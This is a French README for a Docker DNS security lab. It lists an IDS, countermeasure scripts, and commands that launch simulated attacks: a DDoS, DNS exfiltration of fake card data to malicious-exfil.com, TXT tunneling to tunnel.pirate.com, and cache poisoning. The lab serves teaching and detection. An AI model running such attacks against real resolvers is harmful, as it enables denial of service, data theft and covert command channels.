# Activité 3 : Blue Team - Détection et Contre-mesures DNS (DNSathon 2026)

Ce dossier `blueteam/` et les services ajoutés dans `docker-compose.yml` (`blueteam-monitoring` et `blueteam-attacker`) constituent le laboratoire d'analyse, d'attaque simulée et de réponse à incident (Blue Team).

## 1. Architecture des Conteneurs Blue Team

- **`blueteam-monitoring` (172.28.0.10)** : Poste d'analyse SOC / Blue Team. Contient `tcpdump`, le moteur de détection en temps réel (`detect_engine.py`) et les scripts de contre-mesures.
- **`blueteam-attacker` (172.28.0.20)** : Machine cliente / attaquante simulant les 4 types d'attaques DNS contre le résolveur Unbound (`172.28.0.2`).

## 2. Structure des Fichiers

- `blueteam/scripts_detection/detect_engine.py` : Moteur IDS analysant les flux DNS (calcul d'entropie Shannon pour l'exfiltration, détection de volumétrie pour DDoS/Water Torture, détection de trafic TXT excessif pour Tunneling, détection de sous-domaines aléatoires pour Kaminsky Cache Poisoning).
- `blueteam/scripts_attaques/` :
  - `simul_ddos.py` : Random Subdomain Flood / Water Torture.
  - `simul_exfiltration.py` : Exfiltration fragmentée encodée en Base32.
  - `simul_tunneling.py` : Polling C2 via requêtes TXT.
  - `simul_poisoning.py` : Tentatives de Cache Poisoning (style Kaminsky).
- `blueteam/scripts_contremesures/` :
  - `contre_ddos.sh` : Règle iptables hashlimit.
  - `contre_exfiltration.sh` : Blocage RPZ / local-zone dans Unbound.
  - `contre_tunneling.sh` : Filtrage TXT et blocage de domaine.
  - `contre_poisoning.sh` : Vérification DNSSEC/0x20 et vidage du cache Unbound.
- `blueteam/scripts_demo/demo_master.sh` : Script d'orchestration pour exécuter les démonstrations.

## 3. Lancer une Démonstration

### Terminal 1 (Sonde de Détection IDS Blue Team)
```bash
docker exec -it blueteam-monitoring bash -c "tcpdump -i eth0 udp port 53 -n -l 2>/dev/null | python3 /root/detection/detect_engine.py"
```

### Terminal 2 (Simulation des Attaques & Déploiement des Contre-mesures)
```bash
# Pour exécuter toutes les démos séquentiellement :
docker exec -it blueteam-attacker bash /root/demo/demo_master.sh all

# Ou individuellement :
# 1. DDoS :
docker exec -it blueteam-attacker python3 /root/attacks/simul_ddos.py --dns 172.28.0.2 --domain banque.bj --count 150 --delay 0.005

# 2. Exfiltration :
docker exec -it blueteam-attacker python3 /root/attacks/simul_exfiltration.py --dns 172.28.0.2 --domain malicious-exfil.com --data "NUM_CB:4532015112830366 CVV:737 EXP:12/27"

# 3. Tunneling :
docker exec -it blueteam-attacker python3 /root/attacks/simul_tunneling.py --dns 172.28.0.2 --domain tunnel.pirate.com --rounds 20

# 4. Cache Poisoning :
docker exec -it blueteam-attacker python3 /root/attacks/simul_poisoning.py --dns 172.28.0.2 --domain banque.bj --attempts 50
```
